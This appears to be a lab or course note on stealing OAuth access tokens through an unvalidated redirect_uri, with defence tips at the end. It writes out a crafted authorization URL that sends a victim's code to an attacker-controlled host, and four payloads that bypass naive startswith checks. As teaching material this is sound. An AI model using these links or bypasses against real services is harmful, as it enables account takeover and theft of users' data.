# Stealing Access Tokens via OAuth Misconfigurations

When the `redirect_uri` parameter isn't properly validated by the OAuth Authorization Server, attackers can trick victims into giving them their access token or authorization code.

---

## Attack Overview
- **Vulnerable condition:** Authorization server allows any `redirect_uri` (even attacker-controlled URLs) or insufficiently validates only by `startswith`, substring, etc.
- **Effect:** Authorization code (and thus access token) is sent to attacker after victim clicks a social engineered link and logs in.

## Exploit Steps (Lab Scenario)
1. **Find `client_id`:** Complete a normal OAuth login flow and note client_id.
2. **Create malicious auth URL:**
   ```
   http://hubgit.htb/authorization/auth?response_type=code&client_id=<clientid>&redirect_uri=http://attacker.htb/callback&state=xyz
   ```
3. **Send link to victim** via phishing, open-redirect, or XSS. Victim authenticates as normal.
4. **Victim's browser is redirected (after login) to attacker-controlled endpoint:** Authorization code now in attacker's logs (`attacker.htb/log`).
5. **Attacker completes OAuth flow:**
   - Uses code to request access token from Authorization Server, impersonating victim.
6. **With access token in hand, attacker can now:**
   - Make requests to the client/resource server as victim
   - e.g. access personal data, change settings, etc.

---

### Bypassing Flawed Validation
- Real-world code may only do a *naive* match like:
   - `redirect_uri.startswith("http://academy.htb")`
- Possible bypasses:
   - `http://academy.htb.attacker.htb/callback`
   - `http://academy.htb@attacker.htb/callback`
   - `http://attacker.htb/callback#a=http://academy.htb`
   - `http://attacker.htb/callback?url=http://academy.htb`

---

## Defense Tips
- Allow ONLY fully whitelisted, exact-match URLs for redirect_uri.
- Never permit subdomains, fragments, or userinfo tricks.
- Audit for open redirect/parameter pollution in OAuth integrations.

---
**In all flows, always imagine yourself as the authorization server: where could you be tricked into sending tokens somewhere you shouldn't?**
